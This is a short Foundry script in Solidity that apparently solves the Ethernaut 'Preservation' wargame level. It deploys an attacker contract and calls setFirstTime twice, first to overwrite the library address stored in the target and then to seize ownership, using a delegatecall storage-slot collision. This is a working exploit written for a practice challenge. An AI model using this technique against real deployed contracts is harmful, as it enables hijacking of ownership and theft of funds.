// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Preservation.sol";
import "../src/Attacker.sol";

contract PreservationScript is Script {
    address constant preservationAddress = 0x9A3375e6c7307AFa1bC62dcdc60bd2D9527bebB8;

    function run() external {
        address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Preservation preservation = Preservation(preservationAddress);
        Attacker attacker = new Attacker();
        console2.log(preservation.timeZone1Library());
        console2.log(preservation.owner());
        preservation.setFirstTime(uint256(uint160(address(attacker))));
        console2.log(preservation.timeZone1Library());
        preservation.setFirstTime(uint256(uint160(address(EOA))));
        console2.log(preservation.owner());
        vm.stopBroadcast();
    }
}
